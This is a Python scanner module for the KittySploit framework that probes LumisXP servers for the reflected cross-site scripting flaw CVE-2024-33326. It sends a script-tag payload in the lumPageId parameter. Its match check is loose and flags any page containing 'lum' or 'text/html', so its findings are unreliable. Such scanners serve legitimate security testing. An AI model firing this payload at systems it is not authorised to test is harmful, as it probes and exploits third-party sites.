#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting (XSS) vulnerability in the XsltResultControllerHtml."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LumisXP - Cross-site Scripting Detection',
        'description': 'A cross-site scripting (XSS) vulnerability in the XsltResultControllerHtml.jsp component of LumisXP v15.0.x to v16.1.x allows attackers to execute arbitrary web scripts or HTML via the lumPageID parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'xss', 'lumis', 'lumisxp', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/rodnt/51ae2897abfff1bdcedccf72edbf3d24',
            'https://seclists.org/fulldisclosure/2024/Jul/10',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-33326',
        ],
        'cve': 'CVE-2024-33326',
    }

    def run(self):
        for path in ('/portal/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=', '/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath='):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('<script>confirm(document.domain)</script>', 'text/html', 'lum',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="LumisXP - Cross-site Scripting detected",
                    path=path,
                )
                return True
        return False

